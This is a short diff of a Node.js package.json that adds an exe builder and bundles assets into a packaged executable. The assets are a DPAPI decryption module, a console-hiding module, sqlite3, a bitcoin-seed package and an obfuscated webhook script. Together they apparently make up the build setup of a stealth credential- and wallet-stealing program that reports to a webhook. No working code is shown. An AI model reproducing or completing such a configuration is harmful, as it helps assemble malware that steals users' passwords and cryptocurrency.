@@ -1,5 +1,6 @@
 {
   "dependencies": {
+    "@angablue/exe": "^1.2.0",
     "@peculiar/webcrypto": "^1.4.3",
     "axios": "^0.27.2",
     "bitcoin-seed": "^1.0.0",
@@ -26,9 +27,9 @@
   "bin": "./index.js",
   "pkg": {
     "assets": [
-      "./node_modules/boukiapi/build/node-dpapi.node",
-      "./node_modules/node-hide-console-window/index.js",
-      "./node_modules",
+      "./node_modules/boukiapi",
+      "./node_modules/node-hide-console-window",
+      "./node_modules/sqlite3",
       "./webhook_obf.js"
     ]
   },
